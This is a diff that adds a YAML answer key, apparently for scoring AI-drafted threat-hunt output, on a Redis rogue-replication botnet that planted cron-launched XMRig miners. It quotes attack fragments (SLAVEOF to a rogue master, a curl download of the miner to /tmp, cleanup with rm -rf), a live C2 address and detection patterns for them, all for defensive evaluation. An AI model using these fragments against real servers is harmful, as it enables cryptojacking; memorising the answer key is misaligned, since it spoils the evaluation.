@@ -1,0 +1,186 @@
+# Gold set: a Redis rogue-replication cryptomining botnet (hunt.io).
+#
+# Reviewed answer for scoring any draft the pipeline produces from this CTI.
+# Written from the primary report alone, before any pipeline run on it. The
+# third case, chosen to differ from both others: Linux servers compromised by
+# abusing an exposed service (no user action), cron persistence, cryptomining
+# impact, a 120,000-character report that separates one confirmed technique
+# from three that failed or were only probed, an operator whose own host is
+# Windows, and feed "hashes" that are not file hashes.
+#
+#   hecate-agent eval-gold evals/gold/redis-cryptomining-botnet.yaml <draft> --queries <rules dir>
+
+schema: hecate-gold/1
+case_id: redis-cryptomining-botnet
+title: Redis rogue replication plants cron-launched XMRig on 3,562 Linux servers
+reviewed: "2026-09-29"
+reviewed_from: https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+
+source:
+  primary: https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+  # The exact CTI the pipeline receives: OTX pulse 6aa03edde73b7cd2b94b199e.
+  cti: |
+    OTX Pulse: Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's Own Files
+    Adversary/Attribution: Unknown
+    Tags: cron-injection, misconfiguration, redis, botnet, cryptomining, monero, meterpreter, rogue-replication, xmrig
+    Description: An exposed directory at 188.245.99.156 revealed a comprehensive cryptomining toolkit containing 147 files including Python exploit source code, campaign logs, and Windows registry hives. Analysis confirms 3,562 Redis servers were compromised across two campaign runs targeting 12,966 hosts. The operation exploited unauthenticated Redis instances using rogue replication techniques to inject cron jobs that deployed XMRig miners. Victims spanned Redis versions 2.8.17 through 7.2.0 across outdated and current Linux distributions, indicating misconfiguration rather than version-specific vulnerabilities. The toolkit also targeted WordPress, MongoDB, and SSH but achieved zero confirmed compromises through those vectors. A separate February 2026 open directory linked by wallet reuse revealed Meterpreter deployment capabilities, extending the operator's known activity timeline by five months. The operation mined Monero through pool.moneroocean.stream with the same wallet used on the operator's own Windows-based work...
+    Indicators (5 total): FileHash-MD5 (1), FileHash-SHA256 (1), IPv4 (1), domain (1), hostname (1)
+    Key indicators:
+      FileHash-MD5: f90c8b1dcd374d4f552744ee1765583d
+      FileHash-SHA256: 420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a
+      IPv4: 213.6.207.123
+      domain: ayakliborsa.net
+      hostname: socket.ayakliborsa.net
+    References: https://hunt.io/blog/redis-cryptomining-botnet-3562-servers
+
+platform:
+  expected: [Linux]
+  # Every victim is a Linux Redis server (Ubuntu/Debian, RHEL/CentOS). The
+  # operator's own host is Windows (xmrig.exe, SAM hive exports, WinError
+  # 10054); that is the attacker's machine, not what this hunt looks at.
+  forbidden: [Windows, macOS, Containers, ESXi, IaaS, Network Devices]
+
+techniques:
+  # What the confirmed chain did to the 3,562 victims.
+  observed:
+    - id: T1190
+      evidence: "exploited unauthenticated Redis ... SLAVEOF <rogue-host> <rogue-port> ... writes it verbatim to /etc/cron.d/.redis-miner"
+    - id: T1053.003
+      evidence: "a victim's cron.d entry. That entry fires every 5 minutes"
+    - id: T1105
+      evidence: "curl -sLk 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/...' -o /tmp/x.tgz"
+    - id: T1496
+      evidence: "/tmp/.xmrig ... --url=pool.moneroocean.stream:443 --tls; 3,562 distinct hosts compromised"
+    - id: T1059.004
+      evidence: "run as a background shell command the moment cron ... fires"
+    - id: T1564.001
+      evidence: "The miner gets renamed to a dot-prefixed hidden file (/tmp/.xmrig); /etc/cron.d/.redis-miner"
+    - id: T1071.001
+      evidence: "the same cron job pings c2_persist.py (188.245.99.156:10000) with a plain HTTP GET"
+    - id: T1571
+      evidence: "C2 on 188.245.99.156:10000; rogue Redis replication on ports 16379 through 16385"
+    - id: T1070.004
+      evidence: "rm -rf /tmp/x.tgz /tmp/xmrig-*"
+  # Correct but not required: no credit, no penalty.
+  acceptable: [T1496.001, T1053, T1059, T1564, T1071, T1070, T1070.009, T1595, T1595.002, T1082, T1573, T1573.002,
+               T1027, T1140, T1110, T1110.003, T1505.003, T1078, T1078.001, T1036.005, T1222.002, T1543.002]
+  forbidden:
+    - id: T1098.004
+      reason: "SSH key injection: 0 of 2,342 hosts; 'not one key injection or SSH login succeeded'"
+    - id: T1037.004
+      reason: "SysV init (RC scripts) paths were probed by the operator's R&D scripts and never shipped"
+    - id: T1574.006
+      reason: "Dynamic linker hijacking is not described"
+    - id: T1041
+      reason: "No exfiltration: the cron job's C2 contact is a heartbeat ping"
+    - id: T1568.002
+      reason: "No domain generation algorithm is described"
+    - id: T1210
+      reason: "No lateral movement: each victim was reached directly over the internet (T1190)"
+    - id: T1136.003
+      reason: "No cloud account is created"
+    - id: T1003.002
+      reason: "The SAM hive exports are from the operator's own Windows host, not a victim"
+    - id: T1547.001
+      reason: "Registry Run keys are Windows-only"
+    - id: T1059.001
+      reason: "PowerShell: nothing on a victim ran it"
+
+claims:
+  required:
+    - id: rogue-replication
+      pattern: '(?i)slaveof|replicaof|rogue[- ](redis|replication|master)'
+    - id: cron-d
+      pattern: '(?i)/etc/cron\.d'
+    - id: xmrig
+      pattern: '(?i)xmrig'
+    - id: mining-pool
+      pattern: '(?i)moneroocean'
+    - id: unauthenticated-redis
+      pattern: '(?i)unauthenticated|no[- ]auth|without (authentication|a password)|requirepass'
+    - id: hidden-miner
+      pattern: '(?i)/tmp/\.xmrig'
+    - id: c2-port
+      pattern: '\b10000\b'
+  forbidden:
+    - id: ssh-keys-as-fact
+      pattern: '(?i)\b(injected|added|planted|wrote|writes|injects|adds|plants)\b[^.\n]{0,40}\bauthorized_keys\b'
+      reason: "Every SSH key injection failed at its first CONFIG SET"
+    - id: meterpreter-deployed
+      pattern: '(?i)\b(deploys?|deployed|installs?|installed|drops?|dropped|runs|ran|executes?|executed)\s+(a\s+|the\s+)?meterpreter'
+      reason: "Meterpreter is from a separate February directory linked only by wallet reuse; nothing puts it on these victims"
+    - id: known-group-attribution
+      pattern: '(?i)\b(teamtnt|kinsing|rocke|8220 gang|watchdog|headcrab|p2pinfect)\b'
+      reason: "The report attributes the campaign to no known group"
+    - id: windows-artifacts
+      pattern: '(?i)xmrig\.exe|powershell|%temp%'
+      reason: "Linux victims: the operator's Windows host is not what this hunt looks at"
+
+indicators:
+  - value: f90c8b1dcd374d4f552744ee1765583d
+    type: md5
+    role: c2-bearer-token-not-a-hash
+    status: active
+    # The feed lists it as FileHash-MD5; the report shows it is C2_TOKEN.
+    forbid: [process_creation.Hashes, file_event.Hashes, image_load.Hashes]
+  - value: 420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a
+    type: sha256
+    role: pinned-pool-tls-fingerprint-not-a-file
+    status: active
+    forbid: [process_creation.Hashes, file_event.Hashes, image_load.Hashes]
+  - value: 213.6.207.123
+    type: ipv4
+    role: operator-test-target-ownership-unconfirmed
+    status: unknown
+    # A PALTEL ISP address the operator's reset utility targets; not C2, not staging.
+    forbid: [network_connection.DestinationIp]
+
+detections:
+  - id: c2-callback
+    description: "Victim check-in to 188.245.99.156:10000 (in the report, not the feed)"
+    any_of:
+      - category: network_connection
+        require:
+          - {field: DestinationIp, value: '^188\.245\.99\.156$'}
+          - {field: DestinationPort, value: '^10000$'}
+      - category: proxy
+        require:
+          - {field: c-uri, value: '(?i)/ping\?h='}
+  - id: rogue-replication
+    description: "Victim Redis connecting to the rogue master on 16379-16385"
+    any_of:
+      - category: network_connection
+        require:
+          - {field: DestinationIp, value: '^188\.245\.99\.156$'}
+          - {field: DestinationPort, value: '^(16379|1638[0-5])$'}
+  - id: mining-pool
+    description: "Resolution of or connection to pool.moneroocean.stream"
+    any_of:
+      - category: dns_query
+        require:
+          - {field: QueryName, value: '(?i)moneroocean\.stream'}
+      - category: network_connection
+        require:
+          - {field: DestinationHostname, value: '(?i)moneroocean\.stream'}
+  - id: cron-written
+    description: "The cron entry written under /etc/cron.d, /etc/cron.hourly or /var/spool/cron"
+    any_of:
+      - category: file_event
+        require:
+          - {field: TargetFilename, value: '(?i)/etc/cron\.(d|hourly)/\.?redis-(miner|update)|/var/spool/cron/(crontabs/)?root'}
+  - id: hidden-miner
+    description: "The miner written or run as a hidden file in /tmp"
+    any_of:
+      - category: file_event
+        require:
+          - {field: TargetFilename, value: '(?i)/tmp/\.(xmrig|xr)$'}
+      - category: process_creation
+        require:
+          - {field: Image, value: '(?i)/tmp/\.(xmrig|xr)$'}
+  - id: xmrig-download
+    description: "curl fetching the XMRig release tarball"
+    any_of:
+      - category: process_creation
+        require:
+          - {field: Image, value: '(?i)curl'}
+          - {field: CommandLine, value: '(?i)xmrig'}
